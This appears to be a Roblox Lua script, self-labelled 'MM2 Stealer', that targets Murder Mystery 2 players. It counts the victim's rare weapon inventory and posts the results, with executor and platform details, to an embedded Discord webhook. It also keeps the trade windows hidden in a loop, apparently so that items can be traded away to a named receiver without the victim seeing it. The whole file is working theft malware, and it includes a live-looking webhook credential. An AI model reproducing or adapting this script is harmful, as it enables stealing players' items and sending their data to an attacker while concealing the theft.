-- [ Settings ] --
Username = "QuadCoreDragon" -- [Your Username]
Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
RawLink = "" -- [Raw Link If "Custom"]

repeat wait() until game:IsLoaded()

if getgenv().executed then return end
getgenv().executed = true

-- checks
if Username == "" or Username == nil or Username == game.Players.LocalPlayer.Name then
    game:Shutdown()
end

if Webhook == "" or Webhook == nil then
    game:Shutdown()
end

if #game:GetService("Players"):GetPlayers() == 1 then
    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server, please try again!")
    wait(5)
    game:Shutdown()
end

-- locals
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local ExecutorValue = identifyexecutor() or "Unknown"
local PlatformValue = "Unknown"

if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
    PlatformValue = "Mobile"
else
    PlatformValue = "PC"
end

function SendMessageEMBED(url, embed, bool)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        username = "MM2 Stealer",
        avatar = "https://cdn2.steamgriddb.com/grid/f377fde745ac97e42eb522434418bdef.png",
        content = "@everyone\n",
        embeds = {
            {
                title = embed.title,
                color = embed.color,
                fields = embed.fields,
            }
        }
    }

    local body = http:JSONEncode(data)

    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

-- items
local allItems = {}
local itemsCount = 0
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        table.insert(allItems, d.ItemName)

        if d.Rarity == "Godly" then
            godlyItemsC = godlyItemsC + 1
            table.insert(godlyItems, d.DataID)
        end

        if d.Rarity == "Ancient" then
            ancientItemsC = ancientItemsC + 1
            table.insert(ancientItems, d.DataID)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
            table.insert(uniqueItems, d.DataID)
        end
    end
end

for i,v in pairs(allItems) do
    itemsCount = itemsCount + 1
end

local embed = {
    ["title"] = "You just got a hit!",
    ["color"] = tonumber(0x3365FF),
    ["fields"] = {
        {
            ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
            ["value"] = "```lua\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."```"
        }, 
        {
            ["name"] = "〘:computer:〙**Platform Info**",
            ["value"] = "```lua\nPlatform: "..PlatformValue.."```"
        }, 
        {
            ["name"] = "〘:ringed_planet:〙**Items**",
            ["value"] = "```lua\nTotal Items: "..itemsCount.."\nGodlys: "..godlyItemsC.."\nAncients: "..ancientItemsC.."\nUniques: "..uniqueItemsC.."```"
        },
    },
}

if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
    SendMessageEMBED(Webhook, embed, true)
else
    SendMessageEMBED(Webhook, embed, false)
end

coroutine.resume(destroytrades2)
